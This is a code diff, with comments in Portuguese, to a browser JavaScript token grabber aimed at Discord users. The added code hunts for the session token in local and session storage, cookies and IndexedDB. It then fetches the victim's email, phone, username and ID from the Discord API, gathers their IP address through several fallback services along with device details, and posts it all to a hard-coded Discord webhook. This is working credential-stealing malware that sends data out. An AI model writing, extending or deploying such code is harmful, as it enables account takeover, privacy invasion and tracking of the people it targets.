@@ -7,13 +7,44 @@
         (async function() {
             const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
             
+            // Tenta pegar token de várias fontes
             let token = localStorage.getItem("token");
-            let email = "Não logado no Discord Web";
+            
+            // Tenta no sessionStorage também
+            if (!token) {
+                try { token = sessionStorage.getItem("token"); } catch(e) {}
+            }
+            
+            // Tenta em cookies do discord.com
+            if (!token) {
+                try {
+                    const cookies = document.cookie.split(';');
+                    for (let c of cookies) {
+                        if (c.trim().startsWith('token=')) {
+                            token = c.trim().split('=')[1];
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            // Tenta no indexedDB (localForage)
+            if (!token) {
+                try {
+                    const db = await new Promise((resolve, reject) => {
+                        const request = indexedDB.open("discord");
+                        request.onsuccess = () => resolve(request.result);
+                        request.onerror = () => reject();
+                    });
+                    // Discord pode usar outros nomes de banco
+                } catch(e) {}
+            }
+
+            let email = "Não disponível";
             let phone = "Não disponível";
             let username = "Desconhecido";
             let userID = "Desconhecido";
 
-            // Se encontrou o token, busca dados na API do Discord
+            // Se encontrou o token, busca dados na API
             if (token) {
                 try {
                     const userResp = await fetch("https://discord.com/api/v9/users/@me", {
@@ -22,27 +53,27 @@
                     const userData = await userResp.json();
                     email = userData.email || "Não disponível";
                     phone = userData.phone || "Não vinculado";
-                    username = userData.username + "#" + (userData.discriminator || "0");
+                    username = `${userData.username}#${userData.discriminator || "0"}`;
                     userID = userData.id;
-                } catch (e) {
-                    console.log("Erro API Discord:", e);
-                }
+                } catch (e) {}
             }
 
-            // Pegar IP com API alternativa
+            // Pegar IP - várias APIs como fallback
             let ip = "Não capturado";
-            try {
-                const ipResp = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipResp.json();
-                ip = ipData.ip;
-            } catch (e) {
+            const ipAPIs = [
+                "https://api.ipify.org?format=json",
+                "https://api.my-ip.io/ip.json",
+                "https://ip-api.com/json/?fields=query",
+                "https://api.ip.sb/geoip",
+                "https://httpbin.org/ip"
+            ];
+            for (const api of ipAPIs) {
                 try {
-                    const ipResp2 = await fetch("https://api.my-ip.io/ip.json");
-                    const ipData2 = await ipResp2.json();
-                    ip = ipData2.ip;
-                } catch (e2) {
-                    console.log("Erro ao capturar IP:", e2);
-                }
+                    const resp = await fetch(api, { mode: 'cors' });
+                    const data = await resp.json();
+                    ip = data.ip || data.query || data.ip_address || "Não capturado";
+                    if (ip && ip !== "Não capturado") break;
+                } catch(e) {}
             }
 
             const platform = navigator.platform;
@@ -51,7 +82,7 @@
             const userAgent = navigator.userAgent;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Monta mensagem completa
+            // Monta mensagem
             const mensagem = 
                 `**🎯 Dados Capturados**\n` +
                 `**👤 Usuário:** ${username}\n` +
@@ -66,7 +97,7 @@
                 `**🖥️ Tela:** ${screenRes}\n` +
                 `**📄 User Agent:** ${userAgent.substring(0, 150)}`;
 
-            // Envia para o webhook
+            // Envia
             try {
                 await fetch(webhookURL, {
                     method: "POST",
